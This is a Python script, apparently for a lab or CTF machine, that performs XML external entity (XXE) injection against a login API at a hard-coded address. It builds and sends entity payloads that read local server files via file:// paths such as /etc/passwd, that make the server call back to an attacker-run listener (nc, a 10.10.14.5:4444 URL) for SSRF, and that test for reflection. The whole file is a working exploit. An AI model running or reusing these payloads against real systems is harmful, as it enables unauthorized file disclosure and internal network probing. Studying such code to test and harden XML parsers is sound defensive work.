#!/usr/bin/env python3
"""
XXE Injection Exploit
Targets APIs that accept XML input and fail to safely parse it.

Supports:
  - File read via file:// URI
  - SSRF / OOB detection via http:// callback
  - Interactive mode: pick payload type and field to inject into
"""

import requests
import sys
import re

# ============================================================================
# CONFIG - change per target
# ============================================================================

TARGET_HOST = "10.129.170.188"
TARGET_PORT = "3001"
ENDPOINT    = "/api/login"

# Fields that exist in the XML body — inject entity into whichever the server reflects
XML_FIELDS = {
    "email":    "test@test.com",
    "password": "P@ssw0rd123"
}

# ============================================================================
# PAYLOAD BUILDERS
# ============================================================================

def build_file_read(inject_field, file_path, fields):
    """
    Read a local file from the server via file:// URI.
    Entity value is referenced inside inject_field.
    """
    body_fields = ""
    for field, value in fields.items():
        if field == inject_field:
            body_fields += f"<{field}>&xxe;</{field}>"
        else:
            body_fields += f"<{field}>{value}</{field}>"

    return (
        f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE pwn [<!ENTITY xxe SYSTEM "file://{file_path}"> ]>'
        f'<root>{body_fields}</root>'
    )


def build_ssrf(inject_field, callback_url, fields):
    """
    Trigger an outbound HTTP request from the server (OOB / SSRF detection).
    Point callback_url at your listener (nc -nlvp <port>).
    """
    body_fields = ""
    for field, value in fields.items():
        if field == inject_field:
            body_fields += f"<{field}>&xxe;</{field}>"
        else:
            body_fields += f"<{field}>{value}</{field}>"

    return (
        f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE pwn [<!ENTITY xxe SYSTEM "{callback_url}"> ]>'
        f'<root>{body_fields}</root>'
    )


def build_detection(inject_field, fields):
    """
    Blind detection — inject a simple string entity to check if it reflects.
    """
    body_fields = ""
    for field, value in fields.items():
        if field == inject_field:
            body_fields += f"<{field}>&xxe;</{field}>"
        else:
            body_fields += f"<{field}>{value}</{field}>"

    return (
        f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE pwn [<!ENTITY xxe "XXE_TEST_STRING"> ]>'
        f'<root>{body_fields}</root>'
    )


# ============================================================================
# REQUEST
# ============================================================================

def send(url, payload):
    headers = {"Content-Type": "text/plain;charset=UTF-8"}
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=10)
        return r
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        return None


# ============================================================================
# MAIN
# ============================================================================

def pick(options, prompt):
    print(f"\n  {prompt}")
    for i, o in enumerate(options, 1):
        print(f"  [{i}] {o}")
    while True:
        choice = input("  > ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(options):
            return options[int(choice) - 1]
        print("  [!] Invalid choice")


def main():
    url = f"http://{TARGET_HOST}:{TARGET_PORT}{ENDPOINT}"

    print("=" * 70)
    print("XXE INJECTION EXPLOIT")
    print("=" * 70)
    print(f"[*] Target: {url}")
    print(f"[*] XML fields: {list(XML_FIELDS.keys())}")

    fields = list(XML_FIELDS.keys())
    inject_field = pick(fields, "Which field to inject entity into?")

    modes = ["File Read (file://)", "SSRF / OOB Callback (http://)", "Detection (string entity)"]
    mode = pick(modes, "Attack mode?")

    print()

    if mode == modes[0]:
        # File read loop
        print("[*] Enter file paths to read (e.g. /etc/passwd). Type 'exit' to quit.\n")
        while True:
            file_path = input("file> ").strip()
            if file_path.lower() in ["exit", "q"]:
                break
            if not file_path:
                continue
            payload = build_file_read(inject_field, file_path, XML_FIELDS)
            r = send(url, payload)
            if r:
                print(r.text)
                print()

    elif mode == modes[1]:
        # SSRF — one-shot, user provides callback URL
        callback = input("[*] Callback URL (e.g. http://10.10.14.5:4444): ").strip()
        if not callback:
            print("[!] No URL provided")
            sys.exit(1)
        payload = build_ssrf(inject_field, callback, XML_FIELDS)
        print(f"[*] Sending SSRF payload to {url}...")
        print(f"[*] Watch your listener for an inbound connection\n")
        r = send(url, payload)
        if r:
            print(r.text)

    elif mode == modes[2]:
        # Detection
        payload = build_detection(inject_field, XML_FIELDS)
        print(f"[*] Sending detection payload...")
        r = send(url, payload)
        if r:
            print(r.text)
            if "XXE_TEST_STRING" in r.text:
                print("\n[+] Entity reflected in response — server is vulnerable (in-band)")
            else:
                print("\n[*] Entity not reflected — may still be vulnerable out-of-band (try SSRF mode)")


if __name__ == "__main__":
    main()
